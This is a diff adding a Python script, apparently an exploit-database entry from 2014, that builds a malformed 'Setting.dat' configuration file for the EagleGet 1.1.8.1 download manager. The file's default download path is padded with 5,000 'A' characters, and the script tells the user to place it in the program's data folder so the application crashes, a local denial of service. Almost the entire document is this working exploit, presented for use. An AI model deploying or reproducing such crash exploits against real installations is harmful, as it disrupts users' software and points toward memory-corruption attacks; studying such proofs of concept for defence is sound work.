@@ -1,0 +1,118 @@
+# Exploit Title: EagleGet 1.1.8.1 DoS Exploit
+# Date: 03 April 2014
+# Exploit Author: Interference Security
+# Vendor Homepage: http://www.eagleget.com/
+# Software Link: http://www.eagleget.com/download/
+# Version: 1.1.8.1
+# Tested on: Microsoft Windows XP SP3
+
+print "[*] Crash PoC for EagleGet 1.1.8.1 tested on Windows XP SP3"
+print '[*] Creating "Setting.dat" file'
+s1 = """[MONITORING]
+repair_browser_type=0
+clipboard_monitoring=1
+browser_monitoring=1
+media_dl_btn_show=1
+pasue_monitor_by_key=0
+universal_capture_mode=1
+monitor_file_type=.exe;.zip;.rar;.tar;.gz;.mp3;.mp4;.3gp;.rm;.rmvb;.mpeg;.mpg;.wav;.pdf;.chm;.iso;.msi;.7z;.aac;.ape;.flac;.mkv;.mov;.ogg;.torrent;.apk;.wmv;
+not_monitor_sites=siteseal.thawte.com;ecom.cimetz.com;*.voice2page.com;
+[GENERAL]
+run_with_boost=1
+disable_user_guide=0
+auto_category=0
+min_opt=0
+close_opt=1
+"""
+s2 = "defualt_dl_path=C:\\Documents and Settings\\tester\\My Documents\\EagleGet Downloads\\" + "A"*5000
+s3 = """
+general_default_save_path=C:\Documents and Settings\tester\My Documents\EagleGet Downloads\General
+media_default_save_path=C:\Documents and Settings\tester\My Documents\EagleGet Downloads\Media
+documents_default_save_path=C:\Documents and Settings\tester\My Documents\EagleGet Downloads\Documents
+software_default_save_path=C:\Documents and Settings\tester\My Documents\EagleGet Downloads\Software
+compressd_default_save_path=C:\Documents and Settings\tester\My Documents\EagleGet Downloads\Compressed
+use_last_file_category_folder=1
+user_license=1
+alway_overwrite_exist_file=0
+[CONNECTION]
+max_download_num=8
+max_upload_num=8
+max_retry_num=10
+sync_dl_task_num=5
+download_limits=0
+max_download_rate=2048
+upload_limits=1
+max_upload_rate=2048
+auto_resume_download=0
+auto_resume_upload=0
+user_agent_type=4
+custom_agent=
+show_server_file_time=1
+[PROXY]
+proxy_content_type=0
+[HTTP_PROXY]
+proxy_content_address=
+proxy_content_port=80
+proxy_content_user=
+proxy_content_password=
+[SOCKET_PROXY]
+proxy_content_address=
+proxy_content_port=1080
+proxy_content_user=
+proxy_content_password=
+[AUTOMATION]
+disable_sleep_when_processing=1
+dl_finished_shutdown=0
+dl_finish_check_virus=0
+antivirus_process_path=
+antivirus_params=
+antivirus_scan_file_type=.zip; .rar; .exe; .doc; .com; .bin; .gz; .tar; .arj; .lzh; .msi; .cab;
+automation_type=0
+[SCHEDULE]
+scheduel_stop=0
+insert_head_of_schedule_queue=0
+schedule_type=0
+schdeule_daily_type=127
+schedule_start_time=20:00:00
+schedule_stop_time=23:00:00
+schedule_daily_date=2014-04-03
+[SILENTMODE]
+silent_mode=0
+show_taskmonitor=1
+show_add_dwonload_wnd=1
+show_finish_notify_dlg=1
+play_finish_notify_sound=1
+[CLOUD]
+del_file_ul_finish=0
+default_cloud_type=0
+dropbox_info_user=
+dropbox_info_password=
+google_drive_info_user=
+google_drive_info_password=
+skydrive_info_user=
+skydrive_info_password=
+[OTHER]
+show_dlg_del_stask_=1
+show_dlg_del_mtasks_=1
+show_dlg_exit_proc_=1
+disable_auto_update=0
+ui_init_pos=259,13,1109,613
+column_size=45,156,135,115,251
+export_list_save_path=
+[FLOATWND]
+float_wnd_pos_x=1195
+float_wnd_pos_y=30
+[LANGUAGE]
+user_ui_language=32821
+[AUTOUPDATE]
+auto_update_file=
+auto_update_file_md5=
+auto_update_file_params=
+"""
+settings = s1+s2+s3
+f = open("Setting.dat", "w")
+f.write(settings)
+print "[*] File created."
+print '[*] Copy file to "C:\\Documents and Settings\\<username>\\Application Data\\EagleGet\\UserData"'
+print "[*] Run EagleGet and Let it Crash ;)"
+print "[*] Done"
